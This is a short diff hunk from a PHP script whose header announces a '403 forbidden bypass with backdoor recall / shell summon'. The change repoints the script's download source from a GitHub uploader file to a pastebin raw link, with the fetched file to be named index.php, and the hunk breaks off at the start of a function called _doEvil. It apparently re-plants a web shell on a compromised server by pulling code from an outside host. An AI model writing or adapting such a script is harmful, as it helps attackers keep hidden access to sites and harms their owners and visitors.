@@ -3,7 +3,7 @@
 	403 FORBIDDEN BYPASS
 	WITH BACKDOOR RECALL / SHELL SUMMON
 */
-$source = "https://raw.githubusercontent.com/tamasec/uploader/master/index.php";
+$source = "https://pastebin.com/raw/i35FCsAL";
 $name = "index.php";
 
 function _doEvil($name, $file) {
